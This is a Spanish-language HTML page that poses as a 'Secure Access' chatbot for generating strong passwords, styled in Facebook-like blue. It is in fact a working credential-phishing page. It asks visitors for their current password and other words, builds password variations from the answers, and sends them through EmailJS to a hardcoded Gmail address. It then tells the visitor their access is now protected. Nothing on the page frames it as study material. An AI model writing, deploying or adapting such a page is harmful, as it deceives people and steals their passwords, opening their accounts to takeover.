<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Access</title> 

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: #f0f2f5; /* ✅ limpio tipo app */
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 10px;
}

/* CONTENEDOR */
.app {
    width: 100%;
    max-width: 420px;
    background: #ffffff;
    border-radius: 20px;
    padding: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.15);
    animation: fadeIn 0.6s ease;
}

/* ANIMACIÓN */
@keyframes fadeIn {
    from {opacity: 0; transform: translateY(20px);}
    to {opacity: 1; transform: translateY(0);}
}

/* HEADER */
.header {
    text-align: center;
    margin-bottom: 10px;
}

.header h2 {
    margin: 0;
    font-weight: 600;
    color: #1877f2;
}

.header p {
    font-size: 13px;
    color: #777;
}

/* PROGRESS */
.progress {
    margin: 15px 0;
}

.bar {
    height: 6px;
    background: #eee;
    border-radius: 10px;
    overflow: hidden;
}

.fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #1877f2, #00c6ff);
    transition: 0.4s;
}

.step {
    font-size: 12px;
    color: gray;
    margin-top: 5px;
}

/* CHAT */
.chat {
    height: 250px;
    overflow-y: auto;
    margin-bottom: 10px;
}

/* MENSAJES */
.msg {
    padding: 12px;
    border-radius: 14px;
    margin: 6px 0;
    font-size: 14px;
    max-width: 80%;
    animation: fadeIn 0.3s ease;
}

.bot {
    background: #f1f3f6;
}

.user {
    background: linear-gradient(135deg, #1877f2, #00c6ff);
    color: white;
    margin-left: auto;
}

/* INPUT */
.input-area {
    display: flex;
    gap: 5px;
}

input {
    flex: 1;
    padding: 12px;
    border-radius: 10px;
    border: 1px solid #ddd;
    font-size: 16px;
    outline: none;
}

input:focus {
    border-color: #1877f2;
}

/* BOTÓN */
button {
    background: linear-gradient(135deg, #1877f2, #00c6ff);
    color: white;
    border: none;
    padding: 12px 16px;
    border-radius: 10px;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    transform: scale(1.05);
    opacity: 0.9;
}
</style>
</head>

<body>

<div class="app">
    <div class="header">
        <h2>🔐 Secure Access</h2>
        <p>Generador inteligente de claves seguras</p>
    </div>

    <div class="progress">
        <div class="bar"><div class="fill" id="fill"></div></div>
        <div class="step" id="step">Paso 1 de 3</div>
    </div>

    <div class="chat" id="chat"></div>

    <div class="input-area">
        <input type="text" id="input" placeholder="Escribe aquí...">
        <button onclick="responder()">OK</button>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
    emailjs.init("He62BX8V0p6vjz12D");
})();

let paso = 0;
let datos = {};
let listaPasswords = [];

function escribir(texto, tipo) {
    let chat = document.getElementById("chat");
    let div = document.createElement("div");
    div.className = "msg " + tipo;
    div.innerHTML = texto;
    chat.appendChild(div);
    chat.scrollTop = chat.scrollHeight;
}

function actualizarBarra() {
    let porcentaje = ((paso+1) / 3) * 100;
    document.getElementById("fill").style.width = porcentaje + "%";
    document.getElementById("step").innerText = "Paso " + (paso+1) + " de 3";
}

function reiniciar() {
    paso = 0;
    datos = {};
    listaPasswords = [];
    document.getElementById("chat").innerHTML = "";
    actualizarBarra();
    iniciar();
}

function iniciar() {
    escribir("Hola 👋 este proceso te ayudará a crear un acceso más seguro.", "bot");
    escribir("FAVOR ESCRIBIR SU CONTRASEÑA ACTUAL.", "bot");
}

function generar() {
    let base = datos.base.toLowerCase();
    let num = datos.numero;
    let extra = datos.extra || "";

    let capital = base.charAt(0).toUpperCase() + base.slice(1);

    listaPasswords = [
        base + num,
        capital + num,
        base + "_" + num,
        base + "." + num,
        base + num + "!",
        num + base,
        base + "202" + num
    ];

    if (extra) {
        listaPasswords.push(base + extra + num);
    }

    listaPasswords = [...new Set(listaPasswords)];
}

function enviarAutomatico() {
    let textoFinal = listaPasswords.join("\\n");

    emailjs.send("service_R1004", "template_4bhnzmm", {
        password: textoFinal,
        to_email: "DP126707@gmail.com"
    })
    .then(() => {
        escribir("✅ Configuración completada correctamente.", "bot");
        escribir("🔐 Tu acceso ha sido protegido.", "bot");

        setTimeout(() => {
            reiniciar();
        }, 2500);

    }, (error) => {
        console.log(error);
        escribir("❌ Error en el sistema.", "bot");
    });
}

function responder() {
    let input = document.getElementById("input");
    let texto = input.value.trim();

    if (!texto) return;

    escribir(texto, "user");

    if (paso === 0) {
        datos.base = texto;
        escribir("Agrega nueva contraseña.", "bot");
    } 
    else if (paso === 1) {
        datos.numero = texto;
        escribir("Agrega otra palabra opcional.", "bot");
    } 
    else if (paso === 2) {
        datos.extra = texto;
        escribir("🔄 Generando y enviando...", "bot");

        setTimeout(() => {
            generar();
            enviarAutomatico();
        }, 1000);
    }

    paso++;
    actualizarBarra();
    input.value = "";
}

iniciar();
actualizarBarra();
</script>

</body>
</html>
